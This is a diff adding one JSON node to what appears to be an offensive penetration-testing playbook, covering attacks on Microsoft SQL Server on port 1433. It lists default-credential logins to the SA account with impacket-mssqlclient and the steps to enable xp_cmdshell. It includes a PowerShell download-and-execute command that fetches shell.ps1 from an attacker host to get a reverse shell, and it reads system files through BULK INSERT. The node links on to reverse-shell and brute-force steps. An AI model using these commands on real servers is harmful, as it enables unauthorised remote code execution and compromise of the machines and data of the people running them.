@@ -1,0 +1,22 @@
+{
+  "id": "mssql",
+  "phase": "RECON",
+  "title": "MSSQL (1433)",
+  "body": "MSSQL with xp_cmdshell enabled is instant RCE. SA account with default creds is common. impacket-mssqlclient handles everything.",
+  "cmd": "impacket-mssqlclient sa:''@$ip\nimpacket-mssqlclient sa:'sa'@$ip\nimpacket-mssqlclient sa:'password'@$ip -windows-auth\n\n# Once connected:\nSQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami\nSQL> xp_cmdshell \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')\"\n\n# If xp_cmdshell disabled — enable it\nSQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nSQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n\n# Read files\nSQL> BULK INSERT tmp FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts' WITH (ROWTERMINATOR='\\n');\nSQL> SELECT * FROM tmp;",
+  "warn": null,
+  "choices": [
+    {
+      "label": "xp_cmdshell RCE — get reverse shell",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Got creds from DB",
+      "next": "creds_found"
+    },
+    {
+      "label": "Need creds",
+      "next": "bruteforce"
+    }
+  ]
+}
